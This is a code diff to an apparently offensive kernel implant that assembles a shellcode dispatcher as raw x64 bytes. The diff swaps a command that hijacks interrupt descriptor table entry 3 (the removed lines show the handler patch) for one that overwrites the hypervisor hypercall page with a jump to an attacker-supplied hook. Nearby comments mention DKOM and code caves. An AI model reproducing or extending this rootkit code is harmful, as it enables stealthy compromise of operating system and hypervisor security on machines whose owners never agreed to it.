@@ -86,37 +86,27 @@ def construct_dispatcher_stub(mm_copy_addr=0):
         0x74, 0x5C,                                 # je cmd_dkom
         0x83, 0xF8, 0x08,                           # cmp eax, 8 (Surgical IDT Hijack)
         0x74, 0x76,                                 # je cmd_idt
-        0xEB, 0x88,                                 # jmp clear_cmd
+        0x83, 0xF8, 0x09,                           # cmp eax, 9 (Surgical Hypercall Hook)
+        0x74, 0x90,                                 # je cmd_hyper
+        0xEB, 0xA2,                                 # jmp clear_cmd
         
         # ... (other commands) ...
 
-        # Command 0x08: Surgical IDT Hijack
-        # Arg1: IDT Base (from idt_research.py)
-        # Arg2: Our Cave VA (CAVE_VA)
-        # cmd_idt:
+        # Command 0x09: Surgical Hypercall Hook
+        # Arg1: Hypercall Page KVA (from vtl_research.py)
+        # Arg2: Our Hook VA
+        # cmd_hyper:
         0x48, 0x8B, 0xCB,                           # mov rbx, rcx (Mailbox VA)
-        0x48, 0x8B, 0x4B, 0x10,                     # mov rcx, [rbx + 0x10] (IDT Base)
-        0x48, 0x8B, 0x53, 0x18,                     # mov rdx, [rbx + 0x18] (New Handler VA)
+        0x48, 0x8B, 0x4B, 0x10,                     # mov rcx, [rbx + 0x10] (Hypercall Page)
+        0x48, 0x8B, 0x53, 0x18,                     # mov rdx, [rbx + 0x18] (Hook VA)
         
-        # Target IDT Entry 3 (Breakpoint)
-        # Each entry is 16 bytes. Index 3 is at offset 0x30.
-        0x48, 0x83, 0xC1, 0x30,                     # add rcx, 30h
-        
-        # IDT Entry x64 Layout:
-        # 0x00-0x01: Offset Low
-        # 0x06-0x07: Offset Middle
-        # 0x08-0x0B: Offset High
-        
-        # Store original handler in mailbox for safety
-        0x0F, 0xB7, 0x01,                           # movzx eax, word ptr [rcx] (Low)
-        0x48, 0x89, 0x43, 0x38,                     # mov [rbx + 0x38], rax (Part 1)
-        
-        # Patch with New Handler (rdx)
-        0x66, 0x89, 0x11,                           # mov [rcx], dx (Low 16)
-        0x48, 0xC1, 0xEA, 0x10,                     # shr rdx, 16
-        0x66, 0x89, 0x51, 0x06,                     # mov [rcx+6], dx (Mid 16)
-        0x48, 0xC1, 0xEA, 0x10,                     # shr rdx, 16
-        0x89, 0x51, 0x08,                           # mov [rcx+8], edx (High 32)
+        # The Hypercall page contains a 'vmcall' or 'vmmcall' instruction followed by a 'ret'.
+        # We replace it with a jump to our stub.
+        # 0x00: E9 [OFFSET] (jmp rel32)
+        0xC6, 0x01, 0xE9,                           # mov byte ptr [rcx], 0E9h
+        0x48, 0x2B, 0xD1,                           # sub rdx, rcx
+        0x48, 0x83, 0xEA, 0x05,                     # sub rdx, 5
+        0x89, 0x51, 0x01,                           # mov [rcx+1], edx (Patch Relative Offset)
         
         0xC7, 0x43, 0x04, 0x00, 0x00, 0x00, 0x00,   # mov dword ptr [rbx + 0x04], 0
         0xEB, 0x06,                                 # jmp clear_cmd
